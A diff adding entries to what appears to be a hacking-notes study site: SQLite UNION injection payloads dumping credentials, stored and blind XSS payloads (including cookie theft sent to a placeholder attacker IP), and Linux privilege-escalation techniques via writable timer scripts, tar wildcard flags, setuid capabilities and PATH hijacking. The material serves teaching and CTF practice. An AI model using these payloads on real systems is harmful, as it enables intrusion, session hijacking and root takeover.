@@ -801,7 +801,7 @@
     "slug": "mysql-error-based",
     "title": "ERROR BASED SQLI - MYSQL",
     "category": "notes",
-    "blocksFile": "./blocks/sql-error-based.json",
+    "blocksFile": "./blocks/sql-injection/MYSQL/sql-error-based.json",
     "youtubeUrl": "https://youtu.be/agSq415rFEs",
     "goodbyeMessage": "Good luck, and happy hacking 🚀",
     "blocks": [
@@ -948,7 +948,7 @@
     "slug": "postgres-error-based",
     "title": "ERROR BASED SQLI - POSTGRES",
     "category": "notes",
-    "blocksFile": "./blocks/postgres-error-based.json",
+    "blocksFile": "./blocks/sql-injection/Postgres/postgres-error-based.json",
     "youtubeUrl": "https://youtu.be/agSq415rFEs",
     "goodbyeMessage": "Good luck, and happy hacking 🚀",
     "blocks": [
@@ -1056,6 +1056,142 @@
         "type": "paragraph",
         "id": "further-details",
         "text": "This is also pretty straight forward this will give you the row data"
+      }
+    ]
+  },
+  {
+    "id": 4,
+    "slug": "sql-lite-union",
+    "title": "UNION SQLI - SQL_LITE",
+    "category": "notes",
+    "blocksFile": "./blocks/sql-injection/SQL-LITE/union.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "union-sqli-intro",
+        "text": "What is UNION-Based SQL Injection?"
+      },
+      {
+        "type": "order_block",
+        "id": "union-sqli-definition",
+        "text": "UNION-based SQL Injection is a technique where an attacker uses the SQL <highlight>UNION</highlight> operator to combine results from the original query with a malicious query. This allows attackers to retrieve data from other tables in the database."
+      },
+      {
+        "type": "section_heading",
+        "id": "union-column-discovery",
+        "text": "Discovering Column Count Using ORDER BY"
+      },
+      {
+        "type": "code_block",
+        "id": "union-orderby-payloads",
+        "language": "text",
+        "code": "?id=1 ORDER BY 1--\n?id=1 ORDER BY 2--\n?id=1 ORDER BY 3--"
+      },
+      {
+        "type": "order_block",
+        "id": "union-orderby-analysis",
+        "text": "Attackers increase the column number until the database throws an error. The highest valid number indicates how many columns the original query returns. The <highlight>--</highlight> (or <highlight>#</highlight>) is used to comment out the rest of the original query."
+      },
+      {
+        "type": "section_heading",
+        "id": "sqlite-union-basics",
+        "text": "SQLite UNION-Based Injection Basics"
+      },
+      {
+        "type": "order_block",
+        "id": "sqlite-union-definition",
+        "text": "SQLite UNION injection leverages the <highlight>UNION</highlight> operator to bypass original query results and display data from the <highlight>sqlite_master</highlight> table. This is essential for SQLite environments where traditional <highlight>information_schema</highlight> does not exist."
+      },
+      {
+        "type": "section_heading",
+        "id": "sqlite-metadata-extraction",
+        "text": "Extracting SQLite Version and DB Info"
+      },
+      {
+        "type": "code_block",
+        "id": "sqlite-version-db-payloads",
+        "language": "text",
+        "code": "UNION SELECT 1,sqlite_version(),3--\nUNION SELECT 1,file,3 FROM pragma_database_list--"
+      },
+      {
+        "type": "order_block",
+        "id": "sqlite-metadata-analysis",
+        "text": "The <highlight>sqlite_version()</highlight> function returns the library version. <highlight>pragma_database_list</highlight> reveals the absolute path of the database file on the server, which can help map the internal directory structure."
+      },
+      {
+        "type": "section_heading",
+        "id": "sqlite-table-enumeration",
+        "text": "Enumerating Tables via sqlite_master"
+      },
+      {
+        "type": "code_block",
+        "id": "sqlite-tables-payload",
+        "language": "text",
+        "code": "UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--"
+      },
+      {
+        "type": "order_block",
+        "id": "sqlite-tables-analysis",
+        "text": "In SQLite, the <highlight>sqlite_master</highlight> table contains the database schema. Filtering by <highlight>type='table'</highlight> allows us to find the names of all user-created tables."
+      },
+      {
+        "type": "section_heading",
+        "id": "sqlite-column-enumeration",
+        "text": "Enumerating Columns (The 'SQL' Column)"
+      },
+      {
+        "type": "code_block",
+        "id": "sqlite-columns-payload",
+        "language": "text",
+        "code": "UNION SELECT 1,sql,3 FROM sqlite_master WHERE type='table' AND name='users'--"
+      },
+      {
+        "type": "order_block",
+        "id": "sqlite-columns-analysis",
+        "text": "Unlike MySQL, SQLite stores the original <highlight>CREATE TABLE</highlight> statement in the <highlight>sql</highlight> column. Reading this reveals the column names needed to dump data."
+      },
+      {
+        "type": "section_heading",
+        "id": "sqlite-concatenation",
+        "text": "String Concatenation and Multi-Row Dumps"
+      },
+      {
+        "type": "order_block",
+        "id": "sqlite-concat-explanation",
+        "text": "If the application only displays one result field, use <highlight>||</highlight> (pipe operator) for concatenation or <highlight>GROUP_CONCAT()</highlight> to pull all rows into a single string."
+      },
+      {
+        "type": "code_block",
+        "id": "sqlite-concat-payloads",
+        "language": "text",
+        "code": "UNION SELECT 1,username || ':' || password,3 FROM users--\nUNION SELECT 1,GROUP_CONCAT(username),3 FROM users--"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-important-rules",
+        "text": "Important Rules for UNION SQL Injection"
+      },
+      {
+        "type": "explanation",
+        "id": "union-rules-list",
+        "title": "Requirements for UNION Injection",
+        "items": [
+          "The number of columns in the UNION query must match the original query",
+          "Data types in the columns must be compatible with the original columns",
+          "The original query should be made to return 'nothing' (e.g., id=-1) so only the injected data shows",
+          "At least one column from the original query must be visible on the webpage"
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "union-conclusion",
+        "text": "Conclusion"
+      },
+      {
+        "type": "order_block",
+        "id": "union-summary",
+        "text": "UNION-based SQL Injection is a powerful method for data extraction. In <highlight>SQLite</highlight>, the reliance on <highlight>sqlite_master</highlight> and the <highlight>||</highlight> operator are the key differences from MySQL. Mastering these shifts allows for successful enumeration across different database engines."
       }
     ]
   },
@@ -2716,6 +2852,156 @@
   },
   {
     "id": 10,
+    "slug": "stored-xss",
+    "title": "Stored XSS",
+    "category": "notes",
+    "blocksFile": "./blocks/xss/stored.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "stored-xss-definition",
+        "text": "Understanding Stored (Persistent) XSS"
+      },
+      {
+        "type": "order_block",
+        "id": "stored-xss-core-concept",
+        "text": "<highlight>Stored XSS</highlight> is the most dangerous type of XSS. The malicious script is permanently stored on the target server (e.g., in a database). When a victim navigates to the affected page, the browser retrieves the script and executes it automatically."
+      },
+      {
+        "type": "section_heading",
+        "id": "stored-xss-flow",
+        "text": "The Attack Lifecycle"
+      },
+      {
+        "type": "explanation",
+        "id": "stored-xss-steps",
+        "title": "Execution Stages",
+        "items": [
+          "**Injection:** The attacker finds an input field (comments, profile bio, message board) that saves to a database.",
+          "**Storage:** The server fails to sanitize the input and saves the raw JavaScript string.",
+          "**Execution:** Every user who loads that page pulls the script from the database and runs it in their own browser context.",
+          "**Impact:** Can be used for mass cookie theft, redirecting all visitors to a phishing site, or defacing the website."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "stored-xss-examples",
+        "text": "Common Attack Vectors"
+      },
+      {
+        "type": "code_block",
+        "id": "stored-xss-payloads",
+        "language": "javascript",
+        "code": "\n<script>alert('XSS by Azid');</script>\n\n\n<script>document.body.innerHTML = '<h1>Hacked by Azid</h1>';</script>\n\n\n<script>window.location.href='http://malicious-site.com';</script>"
+      },
+      {
+        "type": "section_heading",
+        "id": "stored-xss-comparison",
+        "text": "Why it is NOT Reflected XSS"
+      },
+      {
+        "type": "order_block",
+        "id": "stored-xss-vs-reflected",
+        "text": "Unlike Reflected XSS, which requires a victim to click a <highlight>malicious link</highlight>, Stored XSS is passive. The victim only needs to browse the legitimate website normally to be compromised. It is 'Stored' because the payload lives in the web application's data."
+      },
+      {
+        "type": "section_heading",
+        "id": "stored-xss-prevention",
+        "text": "Developer Best Practices"
+      },
+      {
+        "type": "explanation",
+        "id": "stored-xss-defense",
+        "title": "How to Stop Persistent Scripts",
+        "items": [
+          "**Input Validation:** Only allow expected characters (e.g., alphanumeric only for usernames).",
+          "**Output Encoding:** Convert characters like < to &lt; so the browser treats them as text, not code.",
+          "**Content Security Policy (CSP):** Restrict which scripts can run and where they can load from."
+        ]
+      }
+    ]
+  },
+  {
+    "id": 10,
+    "slug": "blind-xss",
+    "title": "Blind XSS",
+    "category": "notes",
+    "blocksFile": "./blocks/xss/blind.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "blind-xss-core",
+        "text": "Understanding Blind XSS"
+      },
+      {
+        "type": "order_block",
+        "id": "blind-xss-definition",
+        "text": "<highlight>Blind XSS</highlight> is a form of Stored XSS where the malicious payload is executed in a high-privileged application or page that the attacker cannot access. The attacker 'fires and forgets,' waiting for a callback from a victim (usually an administrator) who views the stored data in an internal dashboard."
+      },
+      {
+        "type": "section_heading",
+        "id": "blind-xss-discovery",
+        "text": "Testing for Blind Vulnerabilities"
+      },
+      {
+        "type": "explanation",
+        "id": "blind-xss-testing",
+        "title": "Why alert() Often Fails in Blind Scenarios",
+        "items": [
+          "If you use <highlight>alert()</highlight>, the popup triggers on the Admin's screen, not yours.",
+          "The Admin will immediately know they are under attack and close the ticket/report.",
+          "To succeed, you need an <highlight>Out-of-Band (OOB)</highlight> callback to confirm execution."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "blind-xss-payloads",
+        "text": "The Callback Payload (Silent Data Theft)"
+      },
+      {
+        "type": "code_block",
+        "id": "blind-xss-code",
+        "language": "javascript",
+        "code": "\n<script>new Image().src='http://<ATTACKER_IP>/log?c=' + btoa(document.cookie);</script>\n\n\n<script>fetch('http://<ATTACKER_IP>/?' + btoa(document.cookie));</script>"
+      },
+      {
+        "type": "order_block",
+        "id": "blind-xss-analysis",
+        "text": "The goal is to be <highlight>silent</highlight>. The payload reaches out to the attacker's server, carrying the sensitive session cookie as a URL parameter. The Admin sees nothing unusual on their dashboard while their session is being hijacked."
+      },
+      {
+        "type": "section_heading",
+        "id": "blind-xss-attack-flow",
+        "text": "The 'Wait and See' Methodology"
+      },
+      {
+        "type": "explanation",
+        "id": "blind-xss-flow-steps",
+        "title": "Execution Steps",
+        "items": [
+          "**Identify Entry Point:** Find a form that an admin must eventually review (Support Tickets, Bug Reports, Contact Forms).",
+          "**Deploy Listener:** Set up <highlight>Netcat</highlight>, <highlight>Python SimpleHTTPServer</highlight>, or a tool like <highlight>XSS Hunter</highlight>.",
+          "**Inject Payload:** Submit the callback script into the form.",
+          "**Wait:** Execution only happens when the Admin logs in and views your specific entry.",
+          "**Capture:** Check logs for an incoming GET request containing a Base64 string."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "blind-xss-key-takeaway",
+        "text": "Key Differences"
+      },
+      {
+        "type": "order_block",
+        "id": "blind-xss-vs-stored",
+        "text": "The main difference between Blind and normal Stored XSS is the <highlight>Visibility</highlight>. In normal Stored XSS, you can verify the exploit yourself. In Blind XSS, you rely entirely on your <highlight>external listener</highlight> to know if the attack was successful."
+      }
+    ]
+  },
+  {
+    "id": 10,
     "slug": "blind-xxe",
     "title": "Blind XXE",
     "category": "notes",
@@ -3807,7 +4093,7 @@
     "title": "Union SQL Injection",
     "isLab": false,
     "category": "notes",
-    "blocksFile": "./blocks/sql-injection/union-sql-injection.json",
+    "blocksFile": "./blocks/sql-injection/MYSQL/union-sql-injection.json",
     "goodbyeMessage": "Good luck, and happy hacking 🚀",
     "blocks": [
       {
@@ -7932,6 +8218,59 @@
   },
   {
     "id": 28,
+    "slug": "timer",
+    "title": "Timer",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/PrivEsc-Exploits/timer/timer.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "systemd-timer-intro",
+        "text": "Privilege Escalation via Misconfigured Systemd Timers"
+      },
+      {
+        "type": "order_block",
+        "id": "systemd-timer-concept",
+        "text": "A <highlight>Systemd Timer</highlight> is a unit file that controls a service, often used as a modern replacement for Cron jobs. If a timer executes a script that is <highlight>writable</highlight> by a low-privileged user, that user can inject commands to be executed as the service owner (usually root)."
+      },
+      {
+        "type": "section_heading",
+        "id": "timer-enumeration",
+        "text": "Enumerating Active Timers"
+      },
+      {
+        "type": "code_block",
+        "id": "timer-list-cmd",
+        "language": "bash",
+        "code": "systemctl list-timers --all"
+      },
+      {
+        "type": "order_block",
+        "id": "timer-analysis",
+        "text": "This command reveals which tasks are scheduled. We look for custom scripts or binaries being called by these timers, then check their permissions using <highlight>ls -l</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "timer-exploitation",
+        "text": "Injecting the Malicious Payload"
+      },
+      {
+        "type": "code_block",
+        "id": "timer-injection-code",
+        "language": "bash",
+        "code": "echo 'cp /bin/bash /tmp/root_bash; chmod +s /tmp/root_bash' >> /opt/scripts/timer_script.sh"
+      },
+      {
+        "type": "order_block",
+        "id": "timer-injection-analysis",
+        "text": "By appending a command to the writable script, we wait for the timer to trigger. When it runs, it executes our payload as <highlight>root</highlight>, creating an SUID copy of bash in /tmp."
+      }
+    ]
+  },
+  {
+    "id": 28,
     "slug": "pwm",
     "title": "PWM",
     "isLab": false,
@@ -8210,8 +8549,8 @@
     "title": "Strings",
     "isLab": false,
     "category": "notes",
-    "blocksFile": "./blocks/PrivEsc-Exploits/strings/strings.json",
     "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/PrivEsc-Exploits/strings/strings.json",
     "blocks": [
       {
         "type": "section_heading",
@@ -8290,6 +8629,341 @@
           "To find hardcoded credentials or paths.",
           "To identify external commands being called (like 'id').",
           "To understand the workflow of a custom binary without its source code."
+        ]
+      }
+    ]
+  },
+  {
+    "id": 32,
+    "slug": "tar-wildcard",
+    "title": "TAR Wildcard",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/PrivEsc-Exploits/tar/tar.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "tar-wildcard-intro",
+        "text": "Privilege Escalation via Tar Wildcard Injection (GTFOBins)"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-wildcard-definition",
+        "text": "<highlight>Wildcard Injection</highlight> occurs when a program uses a wildcard (like <highlight>*</highlight>) in a system command. The shell expands the wildcard into a list of filenames before executing the command. If an attacker can create files with names that look like <highlight>command-line flags</highlight>, the program will treat those files as arguments rather than data."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-vuln-identification",
+        "text": "Identifying the Vulnerable Script"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-cat-script",
+        "language": "bash",
+        "code": "cat /opt/backups/backup.sh"
+      },
+      {
+        "type": "output_block",
+        "id": "tar-script-output",
+        "language": "bash",
+        "code": "#!/bin/bash\ntar cf /opt/backups/backup.tar *"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-vuln-analysis",
+        "text": "The script uses <highlight>tar cf ... *</highlight>. Because the wildcard is used, any file in the current directory will be appended to the command. If we create files named <highlight>--checkpoint=1</highlight>, tar will interpret them as functional parameters."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-exploit-payload",
+        "text": "Creating the Malicious Payload"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-payload-creation",
+        "language": "bash",
+        "code": "echo \"cp /bin/bash /tmp/root_bash; chmod +s /tmp/root_bash\" > shell.sh\nchmod +x shell.sh"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-payload-analysis",
+        "text": "We create a script called <highlight>shell.sh</highlight> that copies the bash binary and sets the <highlight>SUID bit</highlight>. When executed by a privileged user, this creates a persistent backdoor shell."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-flag-injection",
+        "text": "Injecting Argument-Files"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-touch-flags",
+        "language": "bash",
+        "code": "touch -- \"--checkpoint=1\"\ntouch -- \"--checkpoint-action=exec=sh shell.sh\""
+      },
+      {
+        "type": "order_block",
+        "id": "tar-flags-analysis",
+        "text": "The <highlight>--checkpoint</highlight> flag tells tar to execute an action after a certain number of files are archived. The <highlight>--checkpoint-action</highlight> flag specifies the command to run. By naming files this way, we trick tar into executing our script."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-execution-trigger",
+        "text": "Triggering the Exploit"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-run-sudo",
+        "language": "bash",
+        "code": "sudo -u michael /opt/backups/backup.sh"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-trigger-analysis",
+        "text": "When the script runs as <highlight>michael</highlight>, the shell expands <highlight>*</highlight> and executes: <highlight>tar cf backup.tar shell.sh --checkpoint=1 --checkpoint-action=...</highlight>. This runs our payload with michael's permissions."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-shell-access",
+        "text": "Entering the Privileged Shell"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-bash-p",
+        "language": "bash",
+        "code": "/tmp/root_bash -p"
+      },
+      {
+        "type": "output_block",
+        "id": "tar-whoami-output",
+        "language": "text",
+        "code": "michael_bash-4.4$ whoami\nmichael"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-final-analysis",
+        "text": "The <highlight>-p</highlight> flag is critical; it prevents bash from dropping the <highlight>SUID</highlight> privileges. You are now operating with the effective UID of the user who ran the backup script."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-cleanup",
+        "text": "Important: Handling Dash-Prefixed Files"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-cleanup-cmd",
+        "language": "bash",
+        "code": "rm -- --checkpoint*"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-cleanup-analysis",
+        "text": "To remove files starting with a dash, you must use the <highlight>--</highlight> separator. This tells the shell that no more command-line options follow, allowing it to process the filenames correctly."
+      }
+    ]
+  },
+  {
+    "id": 32,
+    "slug": "getcap",
+    "title": "GetCap",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/Binaries-Exploitation/getcap.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "capabilities-intro",
+        "text": "Linux Capabilities Privilege Escalation"
+      },
+      {
+        "type": "order_block",
+        "id": "capabilities-definition",
+        "text": "Linux capabilities provide a fine-grained alternative to SUID. If a binary is granted <highlight>cap_setuid+ep</highlight>, it allows the process to change its User ID. Attackers exploit this on interpreters to force a transition to the <highlight>root</highlight> user."
+      },
+      {
+        "type": "section_heading",
+        "id": "discovery-commands",
+        "text": "Identifying Vulnerable Binaries"
+      },
+      {
+        "type": "code_block",
+        "id": "getcap-usage",
+        "language": "bash",
+        "code": "# Recursive search from root (Redirecting errors to null)\ngetcap -r / 2>/dev/null\n\n# Targeted check for specific binaries\ngetcap /usr/bin/perl /usr/bin/python3 /usr/bin/php"
+      },
+      {
+        "type": "order_block",
+        "id": "getcap-analysis",
+        "text": "The <highlight>+ep</highlight> indicates the capability is Effective and Permitted. A binary with <highlight>cap_setuid+ep</highlight> is a critical misconfiguration."
+      },
+      {
+        "type": "section_heading",
+        "id": "perl-escalation",
+        "text": "1. Perl Escalation"
+      },
+      {
+        "type": "code_block",
+        "id": "perl-command",
+        "language": "bash",
+        "code": "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'"
+      },
+      {
+        "type": "order_block",
+        "id": "perl-analysis",
+        "text": "Utilizes the POSIX module to set the process UID to 0 (root) before executing a shell. This bypasses standard password requirements."
+      },
+      {
+        "type": "section_heading",
+        "id": "python-escalation",
+        "text": "2. Python 3 Escalation"
+      },
+      {
+        "type": "code_block",
+        "id": "python-command",
+        "language": "bash",
+        "code": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+      },
+      {
+        "type": "order_block",
+        "id": "python-analysis",
+        "text": "Uses the <highlight>os</highlight> library to trigger the setuid(0) system call. This is the most common target for capability-based escalation."
+      },
+      {
+        "type": "section_heading",
+        "id": "php-escalation",
+        "text": "3. PHP Escalation"
+      },
+      {
+        "type": "code_block",
+        "id": "php-command",
+        "language": "bash",
+        "code": "php -r \"posix_setuid(0); system('/bin/bash');\""
+      },
+      {
+        "type": "order_block",
+        "id": "php-analysis",
+        "text": "Exploits the <highlight>posix_setuid</highlight> function. Note: This requires the PHP-Posix extension to be installed on the target."
+      },
+      {
+        "type": "section_heading",
+        "id": "ruby-escalation",
+        "text": "4. Ruby Escalation"
+      },
+      {
+        "type": "code_block",
+        "id": "ruby-command",
+        "language": "bash",
+        "code": "ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
+      },
+      {
+        "type": "order_block",
+        "id": "ruby-analysis",
+        "text": "Calls the underlying system's setuid via Ruby's <highlight>Process::Sys</highlight> module to spawn a root-level shell."
+      },
+      {
+        "type": "section_heading",
+        "id": "node-escalation",
+        "text": "5. Node.js Escalation"
+      },
+      {
+        "type": "code_block",
+        "id": "node-command",
+        "language": "bash",
+        "code": "node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\", {stdio: [0, 1, 2]})'"
+      },
+      {
+        "type": "order_block",
+        "id": "node-analysis",
+        "text": "Forces the Node process into the root context and spawns a bash child process with inherited standard I/O."
+      },
+      {
+        "type": "section_heading",
+        "id": "capabilities-summary",
+        "text": "Summary of Attack Path"
+      },
+      {
+        "type": "explanation",
+        "id": "capabilities-steps",
+        "title": "Steps Performed",
+        "items": [
+          "Run getcap -r / to locate binaries with cap_setuid permissions",
+          "Identify language interpreters (Perl, Python, PHP, Ruby, Node)",
+          "Use GTFOBins to find the appropriate setuid(0) one-liner",
+          "Execute the payload to transition from low-priv user to root",
+          "Verify the escalation using the whoami command",
+          "Capture the flag in /root or /home/alice (Wonderland specific)"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 32,
+    "slug": "manual-binary-analysis",
+    "title": "Manual Binary Analysis",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/Binary-Analysis/manual-binary.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "binary-grep-intro",
+        "text": "Manual Binary Analysis (Strings Workaround)"
+      },
+      {
+        "type": "order_block",
+        "id": "binary-grep-definition",
+        "text": "When the <highlight>strings</highlight> utility is missing on a target, you can use <highlight>grep</highlight> to extract human-readable text from compiled binaries. This is essential for finding hardcoded paths, hidden commands, or credentials."
+      },
+      {
+        "type": "section_heading",
+        "id": "grep-binary-logic",
+        "text": "The Binary Grep Command"
+      },
+      {
+        "type": "code_block",
+        "id": "grep-binary-command",
+        "language": "bash",
+        "code": "cat <binary_name> | grep -aE '[[:print:]]{4,}'"
+      },
+      {
+        "type": "explanation",
+        "id": "grep-flags-breakdown",
+        "title": "Flag Breakdown",
+        "items": [
+          "-a : Tells grep to treat the binary file as text (Avoids 'Binary file matches' error).",
+          "-E : Enables Extended Regular Expressions.",
+          "'[[:print:]]{4,}' : Matches any sequence of printable characters that is 4 or more characters long."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "vulnerability-identification",
+        "text": "Analyzing the Output"
+      },
+      {
+        "type": "order_block",
+        "id": "path-analysis",
+        "text": "Look for system calls. If you see <highlight>/bin/echo</highlight> (Absolute Path), it is secure. If you see just <highlight>date</highlight> (Relative Path), it is vulnerable to $PATH Hijacking."
+      },
+      {
+        "type": "section_heading",
+        "id": "manual-analysis-summary",
+        "text": "Summary of Attack Path"
+      },
+      {
+        "type": "explanation",
+        "id": "binary-analysis-steps",
+        "title": "Steps Performed",
+        "items": [
+          "Identify SUID binaries using find / -perm -4000",
+          "Attempt to run strings on the binary to find system calls",
+          "Use the cat + grep workaround if strings is not installed",
+          "Search for commands called without absolute paths (e.g., date, ls, cat)",
+          "Create a malicious script with the same name in /tmp",
+          "Export /tmp to the beginning of the $PATH variable",
+          "Execute the SUID binary to trigger the hijack and gain root"
         ]
       }
     ]
